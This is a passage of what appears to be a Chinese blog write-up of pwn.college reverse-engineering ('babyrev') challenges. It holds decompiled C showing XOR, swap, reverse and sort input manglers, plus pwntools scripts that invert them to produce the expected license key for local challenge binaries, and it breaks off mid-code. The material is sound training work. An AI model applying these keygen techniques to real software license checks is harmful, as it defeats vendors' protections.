<p>目标字符串为<code>0x80, 0xD8, 0x4E, 0xC7, 0X99, 0x0B, 0x8B, 0xC8, 0x45, 0xC0, 0x86, 0x06, 0x84, 0xC2, 0x5F, 0xD6, 0x82, 0x03, 0x83</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">18</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = i % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( i % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)buf + i) ^= <span class="number">0xEBu</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v3 &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">        *((_BYTE *)buf + i) ^= <span class="number">0x37u</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)buf + i) ^= <span class="number">0xF1u</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = *((_BYTE *)buf + j);</span><br><span class="line">  *((_BYTE *)buf + j) = *((_BYTE *)buf + <span class="number">18</span> - j);</span><br><span class="line">  *((_BYTE *)buf + <span class="number">18</span> - j) = v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">18</span>; ++k )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( k % <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( k % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">      *((_BYTE *)buf + k) ^= <span class="number">0x46u</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)buf + k) ^= <span class="number">0x1Du</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终脚本为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/challenge/babyrev_level6.1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span></span><br><span class="line">hex_string=[<span class="number">0x80</span>, <span class="number">0xD8</span>, <span class="number">0x4E</span>, <span class="number">0xC7</span>, <span class="number">0X99</span>, <span class="number">0x0B</span>, <span class="number">0x8B</span>, <span class="number">0xC8</span>, <span class="number">0x45</span>, <span class="number">0xC0</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x84</span>, <span class="number">0xC2</span>, <span class="number">0x5F</span>, <span class="number">0xD6</span>, <span class="number">0x82</span>, <span class="number">0x03</span>, <span class="number">0x83</span>]</span><br><span class="line"><span class="comment"># 0x80, 0xD8, 0x4E, 0xC7, 0X99, 0x0B, 0x8B, 0xC8, 0x45, 0xC0, 0x86, 0x06, 0x84, 0xC2, 0x5F, 0xD6, 0x82, 0x03, 0x83</span></span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x46</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x1d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    temp = hex_string[i]</span><br><span class="line">    hex_string[i] = hex_string[<span class="number">18</span> - i]</span><br><span class="line">    hex_string[<span class="number">18</span> - i] = temp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(hex_string)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0xeb</span></span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x37</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0xf1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(hex_string)):</span><br><span class="line">    payload += <span class="built_in">chr</span>(hex_string[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">data = io.recvall()</span><br><span class="line"><span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>逆序进行即可。还是比较简单的。</p>
<h4 id="level7-0"><a href="#level7-0" class="headerlink" title="level7.0"></a>level7.0</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">This</span> challenge is now mangling your input using the `sort` mangler.</span><br><span class="line"><span class="attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="number">16</span>` and `<span class="number">21</span>`.</span><br><span class="line"><span class="attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="number">9</span>` and `<span class="number">22</span>`.</span><br><span class="line"><span class="attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="number">3</span>` and `<span class="number">6</span>`.</span><br><span class="line"><span class="attribute">This</span> challenge is now mangling your input using the `reverse` mangler.</span><br><span class="line"><span class="attribute">Expected</span> result:</span><br><span class="line"></span><br><span class="line">        <span class="attribute">79</span> <span class="number">78</span> <span class="number">78</span> <span class="number">68</span> <span class="number">72</span> <span class="number">73</span> <span class="number">72</span> <span class="number">72</span> <span class="number">72</span> <span class="number">74</span> <span class="number">70</span> <span class="number">6</span>f <span class="number">6</span>f <span class="number">6</span>d <span class="number">6</span>c <span class="number">6</span>a <span class="number">77</span> <span class="number">67</span> <span class="number">65</span> <span class="number">62</span> <span class="number">64</span> <span class="number">62</span> <span class="number">64</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/challenge/babyrev_level7.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span></span><br><span class="line">hex_string=[<span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x78</span>, <span class="number">0x68</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x72</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x6c</span>, <span class="number">0x6a</span>, <span class="number">0x77</span>, <span class="number">0x67</span>, <span class="number">0x65</span> ,<span class="number">0x62</span>, <span class="number">0x64</span>, <span class="number">0x62</span>, <span class="number">0x64</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>]</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(hex_string)):</span><br><span class="line">    payload += <span class="built_in">chr</span>(hex_string[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">data = io.recvall()</span><br><span class="line"><span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为sort在第一个的关系，因此实际上我们需要的是找到expected result即可。</p>
<h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7.1"></a>level7.1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// swap  </span></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *((_BYTE *)&amp;buf + i);</span><br><span class="line">    *((_BYTE *)&amp;buf + i) = *((_BYTE *)&amp;buf + <span class="number">28</span> - i);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">28</span> - i) = v6;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//sort</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">27</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">28</span> - j; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)&amp;buf + k) &gt; *((_BYTE *)&amp;buf + k + <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = *((_BYTE *)&amp;buf + k);</span><br><span class="line">        *((_BYTE *)&amp;buf + k) = *((_BYTE *)&amp;buf + k + <span class="number">1</span>);</span><br><span class="line">        *((_BYTE *)&amp;buf + k + <span class="number">1</span>) = v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// swap</span></span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">13</span>; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *((_BYTE *)&amp;buf + m);</span><br><span class="line">    *((_BYTE *)&amp;buf + m) = *((_BYTE *)&amp;buf + <span class="number">28</span> - m);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">28</span> - m) = v4;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// switch</span></span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">28</span>; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( n % <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0x75u</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0x7Eu</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">1u</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0x3Du</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0xC5u</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<img src="/2025/03/01/pwn-college-题解/image-20241110102042920.png"  alt="image-20241110102042920" style="zoom:67%;" />

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0x0f</span>, <span class="number">0</span>x04, <span class="number">0</span>x7b, <span class="number">0</span>x47, <span class="number">0</span>xbf, <span class="number">0</span>x0c, <span class="number">0</span>x06, <span class="number">0</span>x79, <span class="number">0</span>x4a, <span class="number">0</span>xb0, <span class="number">0</span>x01, <span class="number">0</span>x0d, <span class="number">0</span>x70, <span class="number">0</span>x52, <span class="number">0</span>xaa, <span class="number">0</span>x18, <span class="number">0</span>x12, <span class="number">0</span>x6a, <span class="number">0</span>x56, <span class="number">0</span>xae, <span class="number">0</span>x1f, <span class="number">0</span>x16, <span class="number">0</span>x67, <span class="number">0</span>x59, <span class="number">0</span>xa6, <span class="number">0</span>x16, <span class="number">0</span>x1c, <span class="number">0</span>x63, <span class="number">0</span>x5c</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/challenge/babyrev_level7.1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span></span><br><span class="line">hex_string=[<span class="number">0x0f</span>, <span class="number">0x04</span>, <span class="number">0x7b</span>, <span class="number">0x47</span>, <span class="number">0xbf</span>, <span class="number">0x0c</span>, <span class="number">0x06</span>, <span class="number">0x79</span>, <span class="number">0x4a</span>, <span class="number">0xb0</span>, <span class="number">0x01</span>, <span class="number">0x0d</span>, <span class="number">0x70</span>, <span class="number">0x52</span>, <span class="number">0xaa</span>, <span class="number">0x18</span>, <span class="number">0x12</span>, <span class="number">0x6a</span>, <span class="number">0x56</span>, <span class="number">0xae</span>, <span class="number">0x1f</span>, <span class="number">0x16</span>, <span class="number">0x67</span>, <span class="number">0x59</span>, <span class="number">0xa6</span>, <span class="number">0x16</span>, <span class="number">0x1c</span>, <span class="number">0x63</span>, <span class="number">0x5c</span>]</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    d = i % <span class="number">5</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">0</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x75</span></span><br><span class="line">    <span class="keyword">elif</span> d == <span class="number">1</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x7e</span></span><br><span class="line">    <span class="keyword">elif</span> d == <span class="number">2</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x01</span></span><br><span class="line">    <span class="keyword">elif</span> d == <span class="number">3</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x3d</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0xc5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(hex_string)):</span><br><span class="line">    payload += <span class="built_in">chr</span>(hex_string[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">data = io.recvall()</span><br><span class="line"><span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level8-0"><a href="#level8-0" class="headerlink" title="level8.0"></a>level8.0</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="number">5</span>` and `<span class="number">22</span>`.</span><br><span class="line"><span class="attribute">This</span> challenge is now mangling your input using the `reverse` mangler.</span><br><span class="line"><span class="attribute">This</span> challenge is now mangling your input using the `xor` mangler with key `<span class="number">0</span>x3c7c`</span><br><span class="line"><span class="attribute">This</span> challenge is now mangling your input using the `sort` mangler.</span><br><span class="line"><span class="attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="number">18</span>` and `<span class="number">33</span>`.</span><br><span class="line"><span class="attribute">This</span> challenge is now mangling your input using the `reverse` mangler.</span><br><span class="line"><span class="attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="number">3</span>` and `<span class="number">10</span>`.</span><br><span class="line"><span class="attribute">5f</span> <span class="number">5</span>e <span class="number">46</span> <span class="number">53</span> <span class="number">58</span> <span class="number">57</span> <span class="number">57</span> <span class="number">57</span> <span class="number">56</span> <span class="number">56</span> <span class="number">5</span>a <span class="number">52</span> <span class="number">52</span> <span class="number">4</span>e <span class="number">4</span>e <span class="number">4</span>c <span class="number">4</span>a <span class="number">5</span>b <span class="number">1</span>f <span class="number">1</span>f <span class="number">1</span>f <span class="number">1</span>b <span class="number">19</span> <span class="number">16</span> <span class="number">16</span> <span class="number">14</span> <span class="number">14</span> <span class="number">14</span> <span class="number">12</span> <span class="number">11</span> <span class="number">0</span>d <span class="number">0</span>c <span class="number">0</span>b <span class="number">08</span> <span class="number">06</span> <span class="number">05</span></span><br></pre></td></tr></table></figure>



<p>虽然有这么多层修改，但是只需要关心<code>sort</code>前的修改即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/challenge/babyrev_level8.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span></span><br><span class="line">hex_string=[<span class="number">0x5f</span>, <span class="number">0x5e</span>, <span class="number">0x46</span>, <span class="number">0x53</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x56</span>, <span class="number">0x5a</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x4e</span>, <span class="number">0x4e</span>, <span class="number">0x4c</span>, <span class="number">0x4a</span>, <span class="number">0x5b</span>, <span class="number">0x1f</span>, <span class="number">0x1f</span>, <span class="number">0x1f</span>, <span class="number">0x1b</span>, <span class="number">0x19</span>, <span class="number">0x16</span>, <span class="number">0x16</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x12</span>, <span class="number">0x11</span>, <span class="number">0x0d</span>, <span class="number">0x0c</span>, <span class="number">0x0b</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x05</span>]</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(hex_string)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x3c</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x7c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse</span></span><br><span class="line">reversed_hex_string = hex_string[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># swap</span></span><br><span class="line">temp = reversed_hex_string[<span class="number">5</span>]</span><br><span class="line">reversed_hex_string[<span class="number">5</span>] = reversed_hex_string[<span class="number">22</span>]</span><br><span class="line">reversed_hex_string[<span class="number">22</span>] = temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(reversed_hex_string)):</span><br><span class="line">    payload += <span class="built_in">chr</span>(reversed_hex_string[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">data = io.recvall()</span><br><span class="line"><span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8.1"></a>level8.1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// swap  		0x5e97a08d5571</span></span><br><span class="line">v3 = BYTE6(v15);</span><br><span class="line">  BYTE6(v15) = v17;</span><br><span class="line">  LOBYTE(v17) = v3;</span><br><span class="line"><span class="comment">// reverse		</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">17</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *((_BYTE *)&amp;buf + i);</span><br><span class="line">    *((_BYTE *)&amp;buf + i) = *((_BYTE *)&amp;buf + <span class="number">36</span> - i);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">36</span> - i) = v7;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// swap		0x5e97a08d55de </span></span><br><span class="line">  v4 = BYTE3(buf);</span><br><span class="line">  BYTE3(buf) = BYTE4(v14);</span><br><span class="line">  BYTE4(v14) = v4;</span><br><span class="line"><span class="comment">// xor</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">36</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( j % <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0xA4u</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)&amp;buf + j) ^= <span class="number">0x48u</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// reverse</span></span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">17</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *((_BYTE *)&amp;buf + k);</span><br><span class="line">    *((_BYTE *)&amp;buf + k) = *((_BYTE *)&amp;buf + <span class="number">36</span> - k);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">36</span> - k) = v6;</span><br><span class="line">  